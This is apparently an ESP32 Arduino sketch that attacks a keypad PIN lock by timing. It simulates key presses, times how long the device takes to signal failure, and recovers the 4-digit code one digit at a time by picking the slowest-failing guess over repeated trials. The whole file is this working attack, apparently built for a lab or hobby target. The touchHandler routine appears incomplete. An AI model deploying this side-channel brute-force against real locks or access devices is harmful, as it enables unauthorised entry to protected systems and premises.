#include <Arduino.h>
#include "touchHandle.h"

using namespace keypad;

#define FAIL_PIN GPIO_NUM_27
#define FAIL_PIN2 26
#define SUCCESS_PIN 14
#define PASS_SIZE 4

hw_timer_t * timer = NULL;
volatile uint64_t startTime = 0;
volatile uint64_t endTime = 0;
volatile bool measure = false;

portMUX_TYPE mux = portMUX_INITIALIZER_UNLOCKED;

const uint8_t initPass[PASS_SIZE] = {0,0,0,0};
byte pass[4];

uint64_t sendPassword(uint8_t* password)
{
    for (size_t i = 0; i < PASS_SIZE; i++)
        press(password[i]);
    enter();

    portENTER_CRITICAL(&mux);
        
    timerWrite(timer, 0); // Reset the timer

	while(!digitalRead(FAIL_PIN));

    uint64_t duration = timerRead(timer);

    portEXIT_CRITICAL(&mux);

    return duration;
}

void touchHandler(void*){
    for(;;){
        digitalWrite(row, digitalRead(col));
        if(getCPU)
        portENTER_CRITICAL(&mux);
        portEXIT_CRITICAL(&mux);
    }
}

void setup() {
    Serial.begin(115200);

    timer = timerBegin(0, 2, true); // Use timer 0, prescaler 1 (4.17ns per tick), count up

    pinMode(FAIL_PIN, INPUT_PULLDOWN);
    pinMode(SUCCESS_PIN, INPUT);
    pinMode(ROW_0, OUTPUT);
    pinMode(ROW_1, OUTPUT);
    pinMode(ROW_2, OUTPUT);
    pinMode(ROW_3, OUTPUT);
    pinMode(COL_0, INPUT_PULLUP);
    pinMode(COL_1, INPUT_PULLUP);
    pinMode(COL_2, INPUT_PULLUP);

    delay(1000);
	reset();
    reset();
	delay(4000);

}

void loop(){
    memcpy(pass, initPass, PASS_SIZE);
    for (uint8_t index = 0; index < PASS_SIZE; index++)
    {
        uint8_t maxes[10] = {0,0,0,0,0,0,0,0,0,0};
        uint64_t results[10] = {0,0,0,0,0,0,0,0,0,0};
        for (uint8_t i = 0; i < 20; i++){
            uint64_t max_time = 0;
            for (uint8_t j = 0; j < 10; j++){
                pass[index] = j;
                results[j] = sendPassword(pass);
                if(results[j] > max_time)
                    max_time = results[j];
            }
            for (uint8_t j = 0; j < 10; j++){
                Serial.print(results[j]);
                Serial.print(" ");
            }
            Serial.println();
            for (uint8_t j = 0; j < 10; j++)
                if(results[j] == max_time)
                    maxes[j]++;
        }
        for (uint8_t j = 0; j < 10; j++){
            Serial.print(maxes[j]);
            Serial.print(" ");
        }
        Serial.println();
        uint8_t max = 0;
        uint8_t maxval = 0;
        for (uint8_t j = 0; j < 10; j++)
            if(maxes[j] > maxval){
                max = j;
                maxval = maxes[j];
            }
        pass[index] = max;
        Serial.println(max);
    }
    Serial.println();
}




/*void theEnd(){
    
    Serial.println("The End");
    for (size_t i = 0; i < PASS_SIZE; i++){
        Serial.print(pass[i]);
    }
    vTaskDelete(NULL);
}*/
